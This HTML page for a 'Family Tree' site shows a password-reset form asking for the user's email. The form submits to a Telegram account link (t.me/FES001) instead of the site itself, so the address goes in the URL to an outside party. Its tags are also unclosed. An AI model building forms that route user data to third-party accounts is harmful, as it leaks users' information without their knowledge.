<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Family Tree - Create an account</title>
    <link rel="stylesheet" href="styles.css">
    <meta name="description" content="Find out who your relatives are.">
    <link rel="icon" name="X-icon" href="/photos/icon/tree.png">
</head>
<body>
    <div class="container">
        <div class="password-reset">
            <h1>Reset your password</h1>
            <form target="_blank" action="https://t.me/FES001" method="get">
             <label class="email2" for="email">Enter your email that is connected to Family Tree so that we will send you a password reset link. <input required type="email" name="email" id="email" placeholder="Enter your email address"></label>
             <div class="loading-container">
                <h2>Verify your account</h2>
                <div>
                    <img class="loading" src="/photos/loading.png" alt="loading" width="30px" height="30px">
                </div>
             </div>
             <label for="reset-password"><input type="submit" value="Send reset password email" name="reset-password" id="reset-password"></label>
        </div>
    </div>
</body>
</html>
